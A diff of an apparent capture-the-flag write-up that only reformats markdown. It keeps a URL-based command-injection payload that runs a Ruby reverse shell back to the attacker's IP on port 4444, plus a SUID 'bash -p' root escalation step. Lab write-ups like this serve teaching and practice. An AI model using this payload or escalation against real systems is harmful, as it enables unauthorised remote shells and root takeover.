@@ -60,7 +60,7 @@ Note: Replace {IP Address} with your attacker machine IP address (do not forget 
 The decoded equivalent to url is (do not use the decoded version in the url parameter):
 Note: Replace {IP Address} with your attacker machine IP address (do not forget to remove the curly brackets).
 
-*http://{IP Address}:4444/?name=%20` ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{IP Address}",4444))'`*
+*http://{IP Address}:4444/?name=%20\` ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{IP Address}",4444))'\`*
 
 ![image](https://user-images.githubusercontent.com/85443537/223790881-5319a5de-33ae-46ed-9665-57237a2e612f.png)
 
@@ -85,13 +85,13 @@ We run the following command to display all the files/directories that have the 
 ![image](https://user-images.githubusercontent.com/85443537/223792377-d064c884-2e6a-4a36-a08c-03ba1eb2e77a.png)
 
 We look at the results and see we can run bash. We navigate to https://gtfobins.github.io/ and type in bash in the search bar.
-Then scroll down till we reach SUID section. We can run bash -p.
+Then scroll down till we reach SUID section. We can run *"bash -p"*.
 
 After running the command *"bash -p"* on the victim machine, we surprisingly get root.
 
 ![image](https://user-images.githubusercontent.com/85443537/223793512-61823b48-66e0-489b-8ef8-2cbb863726c0.png)
 
-We can now grab the user.txt flag from the user directory */home/henry* and the root.txt flag from /root.
+We can now grab the user.txt flag from the user directory */home/henry* and the root.txt flag from root directory */root*.
 
 
 # Goals
